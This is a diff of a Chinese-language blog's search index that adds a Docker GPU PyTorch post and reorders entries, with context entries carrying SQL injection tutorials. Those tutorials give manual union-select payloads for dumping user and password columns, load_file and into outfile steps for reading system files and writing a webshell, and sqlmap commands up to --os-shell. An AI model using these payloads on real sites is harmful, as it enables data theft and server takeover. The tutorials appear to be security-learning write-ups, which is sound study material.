@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title></title>
-    <url>%2F2020%2F07%2F08%2FUntitled%2F</url>
-    <content type="text"></content>
+    <title><![CDATA[docker部署gpu-pytorch环境]]></title>
+    <url>%2F2020%2F07%2F28%2Fdocker%E9%83%A8%E7%BD%B2gpu-pytorch%E7%8E%AF%E5%A2%83%2F</url>
+    <content type="text"><![CDATA[概述：最近在公司的服务器上里进行环境部署，需要使用GPU进行深度学习，发现之前使用docker部署的环境直接安装nvidia驱动会不停的产生错误，折腾了一整天，终于成功的在docker镜像中成功部署显卡驱动，使用pytorch成功调用显卡进行深度学习训练，本篇博客对整个docker-torch-gpu部署过程进行记录。 docker中调用GPU关键点1——使用已经部署好GPU的image&emsp;&emsp;这里首先给想要在docker中使用GPU的朋友一个忠告，尽量不要使用已经部署好其他环境的docker来安装GPU驱动，而是直接去找到包含了GPU驱动和cuda的image来安装其他需要的包。 &emsp;&emsp;首先在docker hub上找到pytorch官方发布的images项目，点击进入。 &emsp;&emsp;然后点击Tags按钮在其中找到对应的版本。 &emsp;&emsp;按照对应版本的image后面显示的方式进行下拉镜像。 1docker pull pytorch/pytorch:1.4-cuda10.1-cudnn7-devel &emsp;&emsp;对于需要的cuda版本不清楚的，可以再docker外面使用nvidia-smi查看宿主机所使用的cuda版本进行确定。 注意：上面的截图是另一台机器的截图，按照上面的截图前面pull的镜像也cuda版本应该为10.2，而不是10.1 关键点2——使用runtime属性指定nvidia&emsp;&emsp;使用docker进行GPU利用的第二个关键点就是使用部署好GPU环境的image生成container时，要使用附加参数—runtime指定使用nvidia驱动，创建方式如下： 12345sudo docker run --runtime=nvidia \ # --it \ # 指定交互式启动 -p 12345:8888 \ # 指定端口映射，将容器内8888端口映射成外面可访问的12345端口 -v /home/docker_share:/home/ \ # 设置目录映射，将container内的/home/映射到/home/docker_share image_id bash &emsp;&emsp;使用该命令成功创建并进入docker后，采用nvida-smi命令查看是否GPU可用。出现下面界面证明GPU可用。 参考文献 https://zhuanlan.zhihu.com/p/109477627 https://bluesmilery.github.io/blogs/252e6902/]]></content>
   </entry>
   <entry>
     <title><![CDATA[腾讯AI-WAF建设以及维护经验]]></title>
@@ -111,8 +111,8 @@
     <url>%2F2020%2F01%2F20%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87sqlmap%E8%BF%9B%E8%A1%8Cgetshell%E5%B8%B8%E8%A7%81%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
     <content type="text"><![CDATA[​ 在上一篇文章中，我们提到了要使用sqlmap中自带的os-shell命令直接getshell要有下面四个先条件： 1.当前注入点为root权限 2.已知网站绝对路径 3.php转义功能关闭 4.secure_file_priv= 值为空 在本文中将针对在实际环境中使用sqlmap进行getshell如何获取这些先决条件来进行详细介绍。 1.确认注入点权限​ 首先要确认注入点权限是否为root权限，可以直接使用sqlmap自带的测试命令is-dba 1sqlmap -u 网址 --is-dba 2.网站的绝对路径​ 获取网站的绝对路径在可以先进入sql-shell: 1sqlmap -u 网址 --sql-shell ​ 然后再在sql-shell中直接使用sql命令读取数据库文件存放路径： 1sql-shell&gt; select @@datadir; 然后通过数据库文件的位置进行网站所在的绝对路径进行猜测。]]></content>
       <tags>
-        <tag>sql注入</tag>
         <tag>Web安全</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -120,8 +120,8 @@
     <url>%2F2020%2F01%2F18%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[​ 本文主要对手工方式sql注入进行介绍，包括sql注入的介绍和分类、sql注入中常用的关键字与敏感函数、经典的手工注入、利用sql注入进行文件的写入与读取等几部分。 ​ 后续的sql注入系列文章还将对使用sqlmap进行sql注入以及进行sql注入过程常见的一些关键问题做阐述，可以参见后面的文章： sql注入——sqlmap6步注入法 sql注入——通过sqlmap进行getshell常见的问题 sql注入介绍与分类​ graph LR A(sql注入) --> B(普通注入) A --> C(圆角长方形) C-->D(布尔型盲注) C-->E(延时盲注) ​ 常见的sql注入主要分从注入结果的展现形式上分为普通注入和盲注两大类。最简单也是最常见的就是普通话的sql注入了，这种注入方式进行注入有直观展示的结果进行结果展示，一般可以直接使用union语句进行联合查询获取信息上传文件等操作，后续在经典手工注入流程中讲述的就是使用普通注入进行sql注入。 ​ 另外一大类sql注入就是盲注，这种sql注入方式一般用于页面并没有对sql注入的查询结果直接进行返回，只能通过返回的一些其他信息判断注入的片段是否正确进行了执行。其中根据页面返回的布尔值(页面是否正确返回)进行sql注入称为布尔型盲注，根据页面返回时间的差异确定注入是否成功的sql注入称为延时盲注。下面是一个最常用延时注入的例子： 在上面的例子中，再过个浏览器控制器的控制台中，可以看到该请求存在着10s左右的等待时间，也即是说明我们前面的进行拼遭的sql注入语句正确的进行了执行，因此可以判断该部分是一个可以进行利用的注入点。本文重点介绍一般的注入，关于盲注的具体使用将在后续的文章中进行介绍。 2.sql 注入中常用的关键字和系统表sql注入中常用到的sql关键字 表达式 描述 union 将查询结果进行联合输出，追加在列尾 union all load 文件读取 into outfile 文件写入 @@datadir 数据库文件存放路径 user() 当前用户 version() 数据库版本 database() 数据库名称 sleep(n) 延时执行n秒 @@表示系统变量 mysql中常用的系统表 数据库 表名 描述 information_schema tables mysql中存储的全部表名，使用table_schema指定数据库名 select table_schema.tables where table_scheama=数据库名 information_schema columns mysql中存储全部其他表的字段名，使用table_name指定表名 select information_schema.columns where table_name=表名 Information_schema是mysql中自带的一个数据库，这个数据库中包含了其他数据的各种信息，包括数据库中的表名、权限、字段名等。 3.经典手工注入流程1.注入点测试​ 注入点测试主要分为是否存在sql注入检测与sql注入类型检测两个部分。要检测时候否存在sql注入只需要在要进行检测的参数后面加单引号，看是会因’个数不匹配而报错（这里的报错不一定是真的报错，可能只是页面不在正常显示之前的内容也可以看做报错的一种）。 1http://xxx/abc.php?id=1' ​ sql注入的注入点的类型主要分为数字型注入点和字符型注入点两种，分别对应着要进行sql注入的参数值在数据库中存储的类型是字符型还是数字型，直接影响到后面进行后续的注入的一些细节。 数字型检测​ 当输入变量的类型为数字类型时，可以使用and 1=1和and 1=2配合进行注入点类型进行检测: Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步。 Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。 原因为: 如果当前注入点类型为数字型， ​ 当输入 and 1=1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=1,没有语法错误且逻辑判断为正确，所以返回正常。 ​ 当输入 and 1=2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=2,没有语法错误但是逻辑判断为假，所以返回错误。 而如果该注入点类型为字符型， ​ 当输入and 1=1和 and 1=2时，后台执行sql语句：select * from &lt;表名&gt; where id=&#39;x and 1=1&#39;和 select * from &lt;表名&gt; where id=&#39;x and 1=1,将and语句作为字符进行id匹配，应该都没有查询结果，与事实不符因此该注入点为数字型注入点。 字符型注入点检测当输入变量为字符型时，可以使用’’ and ‘1’=’1和 ‘ and ‘1’=’2配合进行注入点类型检测： 1.Url 地址中输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 页面依旧运行正常，继续进行下一步。 2.Url 地址中继续输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2&#39; 页面运行错误，则说明此 Sql 注入为数字型注入。 原因与上面的数字型注入点检测原理类似，这里就不进行详细讲述了，感兴趣的读者可以自己尝试解释一下。 2.当前表行数测试​ 这里之所以要进行数据表行数测试是因为后面使用union进行联合查询时，明确后面要进行合并查询的列数。 要进行列数测试要使用order by进行测试，不断增加后面的数字，直到出错为止。 1http://xxx/abc.php?id=x order by 8 下面为使用dvwa进行注入测试时的行数测试为例，当使用oder by 1和2时，页面正常显示 当将数字升到3是，产生如下报错，因此我们可以知道该表中只有两行。 3.测试当前表中那些列有回显123# and 1=2为了不展示本改进心跳查询的内容，只展示union进行联合查询的内容# 最后的#是为了闭合本来sql语句中后面的‘http://xxx/abc.php?id=x and 1=2 union select 1,2# 这里dvwa表中本身就只有两列数据全部在前台进行显示 4.查询数据库名称​ 查询当前数据库名称我们可以直接使用数据库内置函数database()进行获取，利用该函数进行当前数据库名称获取的典型注入代码如下所示: 12# 这里将database函数卸载第二个参数位置处，将在第二个参数展示的位置进行展示。也可以写在第一个参数位置http://xxx/abc.php?id=x and 1=2 union select 1,database()# ​ 这里获取到了mysql中存在着名为dvwa的数据库 5.数据表名获取​ 表名获取利用系统自带数据中（mysql中的information_schema）中的tables表中的内容进行获取。tables表中常用的字段如下表所示： 数据表 字段 含义 tables table_schema 字段所属的数据库名 tables table_name 字段所属的表名 ​ 使用下面的语句进行表名探索： 1http://xxx/abc.php?id=x and 1=2 union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos;# 6.字段获取​ 字段获取利用系统自带的数据库（mysql中的information_schema）中的columns表中内容进行获取。columns表中常用字段如下表所示： 数据表 字段 含义 columns table_schema 字段所属的数据库名 columns table_name 字段所属的表名 columns column_name 字段名称 ​ 使用下面语完成对指定表中的字段名称进行探索： 1http://xxx/abc.php?id=x and 1=2 union select 1,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;# ​ 从上面的例子中我们可以看到在users表中存在着User和Password两个字段保存着网站管理员的用户和密码，接下来就可以直接对这两列的内容进行获取了。 7.读取关键字段1http://xxx/abc.php?id=x and 1=2 union select user,password from dvwa.users # 4.文件的写入读取​ 除了上面的基本的注入步骤外，找到注入点后还可以直接利用sql注入漏洞进行进一步的文件相关操作，可以直接通过sql注入实现对文件的读取与写入，利用文件的写入功能实现webshell的上传、系统用户名密码获取等功能。 读取文件​ 在具有文件写入权限时常常可以直接使用进行文件读取，读取到文件后可以xxx 1=1&apos; and 1=2 union select laod_file(&apos;/etc/password&apos;) # 文件写入​ 在具有文件写入权限时可以使用文件读取命令写入小马文件，获取shell。 1=1 and 1=2 union select ’小马文件内容‘into outfile '文件目录+文件名']]></content>
       <tags>
-        <tag>sql注入</tag>
         <tag>Web安全</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -129,8 +129,8 @@
     <url>%2F2020%2F01%2F17%2Fsql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sqlmap6%E6%AD%A5%E6%B3%A8%E5%85%A5%E6%B3%95%2F</url>
     <content type="text"><![CDATA[​ 前段时间一直在研究Webshell相关内容，涉及到使用sql注入进行getshell，因此准备对于sql注入过程做一个比较系统的总结，sql注入部分主要分为sqlmap6步法和手工注入法两部分，本文将主要针对sqlmap注入法进行介绍，手工注入法将在下一篇文章中进行介绍。 sqlmap注入6步法​ 首先要进行介绍的就是sql注入到getshell的常见6步法，该方法涵盖了整个过程常见的全部关键步骤。本文主要介绍使用sqlmap工具来进行sql注入的过程。 1.判定是否存在注入点 12345# 对提供的网址进行注入点测试 sqlmap -u http://xxx/id=??? --batch --batch:表示全部需要人机交互的部分采用默认选项进行选择 --cookie: cookie为可选项，如果要使用登录的请求应该先使用brupsuite来进行抓包查看ccokie写入该参数 --r: post方式进行注入，先使用bp抓到完整的包，然后保存为一个文件，这里直接使用-r进行指定 输出结果： 2.数据库名获取 123# 获取数据库名称sqlmap -u "http://xxx/id=???" --current-db --batch --cunrrent-db：进行数据库探测选项 输出结果： 3.获取数据库中的表名 1234# 获取表名sqlmap -u "http://xxx/id=???" --D 数据库名称 --tables --batch -D：指定要探测数据库名称 --tables：进行表名探索选项 输出结果： 4.对选定表的列名进行获取 1234# 获取表中字段名称sqlmap -u "http://xxx/id=???" --D 数据库名称 --T 表名 --columns --batch -D：指定要进行探索的表 -columns：进行字段名称探索选项 输出结果： 5.探测用户名密码 1234# 获取用户名和密码并保存到指定文件sqlmap -u "http://xxx/id=???" --D 数据库名称 --T 表名 --C 用户名列名,密码列名 --dump -C:指定选择的列名 --dump：将内容输出到文件 输出结果： 6.获取shell ​ os-shell只是一个辅助上传大马、小马的辅助shell，可以使用也可以直接利用数据库备份功能人工上传大、小马不进行这一步。 12# 获取os-shellsqlmap -u "http://xxx/id=???" --os-shell ​ 这里使用os-shell需要很高的权限才能成功使用。具体需要的权限包括： 1.网站必须是root权限 2.了解网站的绝对路径 3.GPC为off，php主动转义的功能关闭 4.secure_file_priv= 值为空 ​ 使用sqlmap存在一种缓存机制，如果完成了一个网址的一个注入点的探测，下次再进行探测将直接使用上次探测的结果进行展示，而不是重新开始探测，因此有时候显示的结果并不是我们当下探测进型返回的，面对这种情况就加上选项。 1--purge 清除之前的缓存日志 ​ 本文中提到的是一个标准的简单环境的sql注获取方式，但是在实际环境中，进行sql注入还存在权限不足、不知道绝对路径等关键问题，这些问题将在[sql注入——getshell中的问题]中进行具体讲述。]]></content>
       <tags>
-        <tag>sql注入</tag>
         <tag>Web安全</tag>
+        <tag>sql注入</tag>
         <tag>sqlmap</tag>
       </tags>
   </entry>
@@ -1077,6 +1077,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[pytorch运算操作]]></title>
+    <url>%2F2018%2F09%2F23%2Fpytorch%E8%BF%90%E7%AE%97%E6%93%8D%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[1.transponse ​ torch.transponse操作是转置操作，是一种在矩阵乘法中最常用的几种操作之一。 12#交换两个维度torch.transponse(dim1,dim2) 2.matmul和bmm ​ matmul和bmm都是实现batch的矩阵乘法操作。 123456789a = torch.rand((2,3,10))b = torch.rand((2,2,10))res1 = torch.matmul(a,b.transpose(1,2))#res1 = torch.matmul(a,b.transose(1,2))print res1.size()output: [torch.FloatTensor of size 2x3x2]]]></content>
+      <categories>
+        <category>pytorch</category>
+      </categories>
+      <tags>
+        <tag>pytorch</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[tmux基本操作]]></title>
     <url>%2F2018%2F09%2F23%2Ftmux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
     <content type="text"><![CDATA[tmux 是一款终端复用命令行工具，一般用于 Terminal 的窗口管理。 tmux核心功能 1.tmux可以在一个窗口中创建多个窗格 2.终端软件重启后通过命令行恢复上次的session 在tmux中快捷键都需要在使用之前先按前缀快捷键(mac默认⌃b,windows默认control)，以下是常用的集中快捷键列表: 1. 窗格操作 % 左右平分出两个窗格 &quot; 上下平分出两个窗格 x 关闭当前窗格 { 当前窗格前移 } 当前窗格后移 ; 选择上次使用的窗格 o 选择下一个窗格，也可以使用上下左右方向键来选择 space 切换窗格布局，tmux 内置了五种窗格布局，也可以通过 ⌥1 至 ⌥5来切换 z 最大化当前窗格，再次执行可恢复原来大小 q 显示所有窗格的序号，在序号出现期间按下对应的数字，即可跳转至对应的窗格 2.会话操作 ​ 在shell中每次输入tmux都会创建一个tmux会话(session)，在tmux中常用的tmux操作包括： $ 重命名当前会话 s 选择会话列表 d detach 当前会话，运行后将会退出 tmux 进程，返回至 shell 主进程 ​ 在shell准进程中也可以进行直接对session进行操作： tmux new -s foo #创建名为foo的会话 tmux ls #列出所有的tmux tmux a #恢复至上一次回话 tmux a -t foo #恢复会话名称为foo的会话 tmux kill-session -t foo #删除会话名称为foo的会话 tmux kill-server #删除所有会话 除了上面常用的快捷键以外，还可以直接使用前缀快捷键⌃b加?来查看所有快捷键列表]]></content>
@@ -1091,17 +1102,6 @@
     <title><![CDATA[pytorch向量转化操作]]></title>
     <url>%2F2018%2F09%2F23%2Fpytorch%E5%90%91%E9%87%8F%E8%BD%AC%E5%8C%96%E6%93%8D%E4%BD%9C%2F</url>
     <content type="text"><![CDATA[1.cat ​ 对数据沿着某一维度进行拼接，cat后数据的总维数不变。 12345678910111213141516171819202122import torchtorch.manual_seed(1)x = torch.randn(2,3)y = torch.randn(1,3)s = torch.cat((x,y),0)print(x,y)print(s)output: 0.6614 0.2669 0.0617 0.6213 -0.4519 -0.1661 [torch.FloatTensor of size 2x3] -1.5228 0.3817 -1.0276 [torch.FloatTensor of size 1x3] 0.6614 0.2669 0.0617 0.6213 -0.4519 -0.1661 -1.5228 0.3817 -1.0276 [torch.FloatTensor of size 3x3] 注：torch.cat和torch.concat作用用法完全相同，只是concat的简写形式 2.unsequeeze和sequeeze ​ torch.sequeeze主要用于维度压缩，去除掉维数为1的维度。 12345678#1.删除指定的维数为1的维度 #方式一： torch.sequeeze(a,2) #方式二： a.sequeeze(2)#2.删除全部维度为1的维度 torch.sequeeze(a) ​ torch.unsequeeze主要用于维度拓展，增加维数为1的维度。 1torch.unsequeeze(a,2) #在维度2增加维数为1的维度]]></content>
-      <categories>
-        <category>pytorch</category>
-      </categories>
-      <tags>
-        <tag>pytorch</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[pytorch运算操作]]></title>
-    <url>%2F2018%2F09%2F23%2Fpytorch%E8%BF%90%E7%AE%97%E6%93%8D%E4%BD%9C%2F</url>
-    <content type="text"><![CDATA[1.transponse ​ torch.transponse操作是转置操作，是一种在矩阵乘法中最常用的几种操作之一。 12#交换两个维度torch.transponse(dim1,dim2) 2.matmul和bmm ​ matmul和bmm都是实现batch的矩阵乘法操作。 123456789a = torch.rand((2,3,10))b = torch.rand((2,2,10))res1 = torch.matmul(a,b.transpose(1,2))#res1 = torch.matmul(a,b.transose(1,2))print res1.size()output: [torch.FloatTensor of size 2x3x2]]]></content>
       <categories>
         <category>pytorch</category>
       </categories>
